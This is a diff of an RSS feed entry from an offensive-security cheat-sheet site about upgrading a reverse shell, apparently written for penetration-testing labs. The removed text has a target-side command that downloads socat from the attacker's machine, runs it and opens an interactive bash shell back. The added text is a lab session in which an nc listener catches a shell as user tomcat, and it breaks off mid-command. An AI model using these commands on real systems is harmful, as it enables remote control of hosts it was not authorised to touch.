@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/upgrade_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/upgrade_shell/</guid>
-      <description>Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color # Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:&amp;lt;LOCAL_PORT&amp;gt; # In target machine wget -q http://&amp;lt;LOCAL_IP&amp;gt;/socat -O /tmp/socat &amp;amp;&amp;amp; chmod +x /tmp/socat &amp;amp;&amp;amp; /tmp/socat exec:&amp;#39;bash -li&amp;#39;,pty,stderr,setsid,sigint,sane tcp:&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt; # In our local Linux machine export TERM=xterm-256color Ref: Download socat</description>
+      <description>Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; $ rlwrap nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 33490 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; tomcat@kotarak-dmz:/$ zsh: suspended rlwrap nc -lvnp 1337 # Ctrl-Z to send the process to background, then stty raw -echo; fg $ stty raw -echo; fg [1] + continued rlwrap nc -lvnp 1337 tomcat@kotarak-dmz:/$ # Start a local http server python3 -m http.</description>
     </item>
   </channel>
 </rss>
